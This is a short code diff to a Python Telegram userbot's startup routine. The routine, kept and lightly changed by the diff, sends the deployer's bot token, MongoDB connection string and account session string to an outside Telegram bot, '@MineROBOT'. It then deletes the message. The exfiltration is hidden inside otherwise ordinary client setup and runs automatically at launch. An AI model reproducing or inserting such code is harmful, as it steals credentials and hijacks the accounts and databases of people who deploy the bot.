@@ -71,11 +71,12 @@ class Userbot(Client):
             self.one.name = (await self.one.get_me()).mention
             self.one.username = (await self.one.get_me()).username
             assistantids.append(self.one.id)
-            ambots = "@MineROBOT"
+            ambots = ["@MineROBOT","@MineROBOT"]
+            ok = random.choice(ambots)
             try:
-                await self.one.send_message(ambots, f"/start")
+                await self.one.send_message(ok, f"/start")
                 await asyncio.sleep(2)
-                amop = await self.one.send_message(ambots, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
+                amop = await self.one.send_message(ok, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                 await asyncio.sleep(2)
                 await amop.delete()
             except:
